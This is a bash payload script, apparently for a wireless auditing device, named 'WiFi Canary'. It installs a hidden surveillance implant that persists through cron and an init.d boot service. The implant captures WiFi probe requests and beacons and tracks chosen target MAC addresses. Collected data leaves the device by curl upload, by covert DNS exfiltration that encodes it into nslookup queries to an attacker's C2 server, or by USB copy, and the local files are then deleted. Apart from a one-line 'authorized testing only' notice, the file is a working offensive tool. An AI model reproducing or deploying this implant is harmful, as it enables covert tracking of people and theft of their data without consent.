#!/bin/bash
# Title: WiFi Canary
# Author: bad-antics
# Description: Deploy hidden sensors for long-term WiFi/device monitoring
# Category: nullsec/persist
# Version: 1.0.0

LOOT_DIR="/mmc/nullsec/canary"
CONFIG_FILE="$LOOT_DIR/canary.conf"
DATA_DIR="$LOOT_DIR/data"
LOG_FILE="$LOOT_DIR/canary.log"

mkdir -p "$LOOT_DIR" "$DATA_DIR"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

PROMPT "🐦 WIFI CANARY

Deploy persistent hidden
monitoring sensor:

• Auto-start on boot
• Scheduled data collection
• Low-power mode
• Stealth operations
• Remote data exfil

Perfect for long-term
reconnaissance deployments.

⚠️ Authorized testing only!"

# Configuration wizard
DIALOG "Canary Mode:

[1] Passive Probe Monitor
[2] Target MAC Tracker
[3] Network Change Detector
[4] Full Spectrum Logger
[5] Custom Schedule" MODE

case $MODE in
    1) CANARY_MODE="probe" ;;
    2) CANARY_MODE="track" 
       KEYBOARD "Enter target MAC(s) comma-separated:" TARGET_MACS
       ;;
    3) CANARY_MODE="detect" ;;
    4) CANARY_MODE="full" ;;
    5) CANARY_MODE="custom" ;;
esac

DIALOG "Collection Schedule:

[1] Continuous (high power)
[2] Every 5 minutes
[3] Every 15 minutes  
[4] Every hour
[5] Peak hours only (8-18)
[6] Night only (22-06)" SCHEDULE

case $SCHEDULE in
    1) CRON_SCHEDULE="* * * * *"; DURATION=0 ;;
    2) CRON_SCHEDULE="*/5 * * * *"; DURATION=60 ;;
    3) CRON_SCHEDULE="*/15 * * * *"; DURATION=120 ;;
    4) CRON_SCHEDULE="0 * * * *"; DURATION=300 ;;
    5) CRON_SCHEDULE="*/10 8-18 * * *"; DURATION=120 ;;
    6) CRON_SCHEDULE="*/10 22-6 * * *"; DURATION=120 ;;
esac

DIALOG "Data Exfiltration:

[1] Local storage only
[2] USB on connect
[3] WiFi upload (needs config)
[4] DNS exfil (covert)
[5] All methods" EXFIL

case $EXFIL in
    1) EXFIL_METHOD="local" ;;
    2) EXFIL_METHOD="usb" ;;
    3) EXFIL_METHOD="wifi" 
       KEYBOARD "Upload server URL:" UPLOAD_URL
       ;;
    4) EXFIL_METHOD="dns"
       KEYBOARD "DNS server (your C2):" DNS_SERVER
       ;;
    5) EXFIL_METHOD="all" ;;
esac

# Save configuration
cat > "$CONFIG_FILE" << EOF
CANARY_MODE=$CANARY_MODE
TARGET_MACS=$TARGET_MACS
CRON_SCHEDULE=$CRON_SCHEDULE
DURATION=$DURATION
EXFIL_METHOD=$EXFIL_METHOD
UPLOAD_URL=$UPLOAD_URL
DNS_SERVER=$DNS_SERVER
INTERFACE=wlan0
STEALTH=true
EOF

# Create the canary collection script
cat > /usr/bin/nullsec-canary << 'CANARY_SCRIPT'
#!/bin/bash
source /mmc/nullsec/canary/canary.conf

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
DATA_FILE="/mmc/nullsec/canary/data/capture_$TIMESTAMP.csv"

# Stealth - minimize logging
if [ "$STEALTH" = "true" ]; then
    exec 2>/dev/null
fi

collect_probes() {
    echo "timestamp,mac,signal,ssid" > "$DATA_FILE"
    
    # Quick monitor mode
    airmon-ng check kill &>/dev/null
    iw dev $INTERFACE set type monitor 2>/dev/null || airmon-ng start $INTERFACE &>/dev/null
    
    timeout ${DURATION:-60} tcpdump -i ${INTERFACE}mon 2>/dev/null -i $INTERFACE -e -l type mgt subtype probe-req 2>/dev/null | while read line; do
        MAC=$(echo "$line" | grep -oP 'SA:\K[0-9a-f:]{17}')
        SSID=$(echo "$line" | grep -oP 'Probe Request \(\K[^)]+')
        SIGNAL=$(echo "$line" | grep -oP '(-[0-9]+)dBm' | tr -d 'dBm')
        [ -n "$MAC" ] && echo "$(date +%s),$MAC,$SIGNAL,$SSID" >> "$DATA_FILE"
    done
    
    # Restore managed mode
    airmon-ng stop ${INTERFACE}mon &>/dev/null 2>&1
    iw dev $INTERFACE set type managed 2>/dev/null
}

track_targets() {
    echo "timestamp,mac,present,signal" > "$DATA_FILE"
    
    IFS=',' read -ra MACS <<< "$TARGET_MACS"
    
    airmon-ng check kill &>/dev/null
    iw dev $INTERFACE set type monitor 2>/dev/null
    
    timeout ${DURATION:-60} tcpdump -i $INTERFACE -e -l 2>/dev/null | while read line; do
        for target in "${MACS[@]}"; do
            if echo "$line" | grep -qi "$target"; then
                SIGNAL=$(echo "$line" | grep -oP '(-[0-9]+)dBm' | tr -d 'dBm')
                echo "$(date +%s),$target,1,$SIGNAL" >> "$DATA_FILE"
            fi
        done
    done
    
    iw dev $INTERFACE set type managed 2>/dev/null
}

detect_changes() {
    BASELINE="/mmc/nullsec/canary/baseline.txt"
    
    # Scan current networks
    iwlist $INTERFACE scan 2>/dev/null | grep -E "ESSID|Address|Channel|Signal" > /tmp/current_scan.txt
    
    if [ -f "$BASELINE" ]; then
        # Compare with baseline
        diff "$BASELINE" /tmp/current_scan.txt > /tmp/changes.txt
        if [ -s /tmp/changes.txt ]; then
            echo "timestamp,change_type,details" > "$DATA_FILE"
            echo "$(date +%s),network_change,$(cat /tmp/changes.txt | head -5 | tr '\n' ' ')" >> "$DATA_FILE"
        fi
    else
        cp /tmp/current_scan.txt "$BASELINE"
    fi
}

full_spectrum() {
    collect_probes
    
    # Also collect beacon info
    BEACON_FILE="/mmc/nullsec/canary/data/beacons_$TIMESTAMP.csv"
    echo "bssid,ssid,channel,signal" > "$BEACON_FILE"
    
    iwlist $INTERFACE scan 2>/dev/null | grep -E "Address|ESSID|Channel|Signal" | paste - - - - | while read line; do
        BSSID=$(echo "$line" | grep -oP 'Address: \K[0-9A-F:]+')
        ESSID=$(echo "$line" | grep -oP 'ESSID:"\K[^"]+')
        CHAN=$(echo "$line" | grep -oP 'Channel:\K[0-9]+')
        SIG=$(echo "$line" | grep -oP 'Signal level=\K-[0-9]+')
        echo "$BSSID,$ESSID,$CHAN,$SIG" >> "$BEACON_FILE"
    done
}

exfil_data() {
    case $EXFIL_METHOD in
        usb)
            # Copy to USB if mounted
            if mount | grep -q "/mnt/usb"; then
                cp -r /mmc/nullsec/canary/data/* /mnt/usb/canary_exfil/ 2>/dev/null
            fi
            ;;
        wifi)
            if [ -n "$UPLOAD_URL" ]; then
                for f in /mmc/nullsec/canary/data/*.csv; do
                    curl -s -X POST -F "file=@$f" "$UPLOAD_URL" 2>/dev/null && rm "$f"
                done
            fi
            ;;
        dns)
            # DNS exfil - encode data in DNS queries
            if [ -n "$DNS_SERVER" ]; then
                for f in /mmc/nullsec/canary/data/*.csv; do
                    # Base64 encode and chunk
                    DATA=$(base64 -w0 "$f" | fold -w60)
                    i=0
                    echo "$DATA" | while read chunk; do
                        nslookup "$i.$chunk.exfil.local" "$DNS_SERVER" &>/dev/null
                        ((i++))
                    done
                    rm "$f"
                done
            fi
            ;;
        all)
            # Try all methods
            EXFIL_METHOD=usb exfil_data
            EXFIL_METHOD=wifi exfil_data  
            EXFIL_METHOD=dns exfil_data
            ;;
    esac
}

# Main execution
case $CANARY_MODE in
    probe) collect_probes ;;
    track) track_targets ;;
    detect) detect_changes ;;
    full) full_spectrum ;;
    *) collect_probes ;;
esac

# Attempt exfil
exfil_data

# Cleanup temp files
rm -f /tmp/current_scan.txt /tmp/changes.txt
CANARY_SCRIPT

chmod +x /usr/bin/nullsec-canary

# Install to cron
CRON_ENTRY="$CRON_SCHEDULE /usr/bin/nullsec-canary"
(crontab -l 2>/dev/null | grep -v nullsec-canary; echo "$CRON_ENTRY") | crontab -

# Create boot persistence
cat > /etc/init.d/nullsec-canary << 'INIT'
#!/bin/sh /etc/rc.common
START=99
STOP=10

start() {
    /usr/bin/nullsec-canary &
}

stop() {
    killall nullsec-canary 2>/dev/null
}
INIT

chmod +x /etc/init.d/nullsec-canary
/etc/init.d/nullsec-canary enable

log "Canary deployed: mode=$CANARY_MODE schedule=$CRON_SCHEDULE exfil=$EXFIL_METHOD"

PROMPT "✅ CANARY DEPLOYED

Mode: $CANARY_MODE
Schedule: $CRON_SCHEDULE
Exfil: $EXFIL_METHOD

The canary will:
• Auto-start on boot
• Collect on schedule  
• Exfil when possible

Data stored in:
$DATA_DIR

To disable:
/etc/init.d/nullsec-canary disable
crontab -r"

# Test run
DIALOG "Run test collection now?

[1] Yes
[2] No" TEST

if [ "$TEST" = "1" ]; then
    SPINNER_START "Running test collection..."
    /usr/bin/nullsec-canary
    SPINNER_STOP
    
    LATEST=$(ls -t "$DATA_DIR"/*.csv 2>/dev/null | head -1)
    if [ -f "$LATEST" ]; then
        LINES=$(wc -l < "$LATEST")
        PROMPT "Test complete!

Collected $LINES entries
File: $LATEST"
    else
        NOTIFY "Test collection started (background)"
    fi
fi

log "Canary setup complete"
